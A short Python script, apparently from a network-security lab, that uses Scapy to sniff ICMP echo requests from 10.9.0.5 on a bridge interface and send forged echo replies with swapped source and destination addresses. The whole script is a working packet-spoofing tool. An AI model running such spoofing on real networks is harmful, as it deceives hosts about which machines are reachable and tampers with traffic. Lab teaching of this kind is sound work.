
#!/usr/bin/python3
from scapy.all import *
def spoof_pkt(pkt):
    newseq=0

    # Check if the captured packet is an ICMP packet
    if ICMP in pkt:
        print("original packet.........")
        print("source IP :", pkt [IP].src)
        print("Destination IP :", pkt [IP]. dst)

        # Swap source and destination IP addresses to spoof the response
        srcip = pkt [IP]. dst
        dstip = pkt[IP].src

        # Prepare new ICMP header fields for the spoofed packet
        newihl = pkt [IP]. ihl
        newtype = 0
        newid = pkt [ICMP].id
        newseq = pkt [ICMP]. seq
        data = pkt [Raw]. load

        # Create the spoofed packet with the manipulated fields
        IPLayer = IP (src=srcip, dst=dstip, ihl=newihl)
        ICMPpkt = ICMP (type=newtype, id=newid, seq=newseq)
        newpkt = IPLayer/ICMPpkt/data
        print ("spoofed packet........")
        print ("Source IP:", newpkt [IP].src)
        print ("Destination IP:", newpkt [IP]. dst)

        # Send the spoofed packet back as a response to the original packet
        send (newpkt, verbose=0)

#replace the interface
pkt = sniff (iface="br-****",filter='icmp and src host 10.9.0.5', prn=spoof_pkt)

